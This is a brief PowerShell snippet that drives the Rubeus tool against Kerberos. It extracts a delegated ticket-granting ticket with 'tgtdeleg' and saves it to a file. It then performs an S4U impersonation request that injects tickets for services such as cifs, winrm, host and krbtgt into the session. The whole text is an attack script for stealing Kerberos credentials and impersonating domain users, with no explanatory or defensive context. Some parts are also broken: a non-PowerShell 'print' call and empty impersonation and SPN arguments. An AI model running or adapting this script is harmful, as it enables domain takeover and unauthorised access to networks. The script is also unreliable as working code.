$out = (cmd /c Rubeus.exe tgtdeleg /nowrap) | Out-String
$ticket = (print $out | select -last 2 | select -first 1).trim() 
$ticket | Out-File kerb.txt
cmd /c Rubeus.exe s4u /user:$usr /impersonateuser: /ticket:$ticket /msdsspn:"" /altservice:cifs,host,http,winrm,RPCSS,wsman,krbtgt /ptt


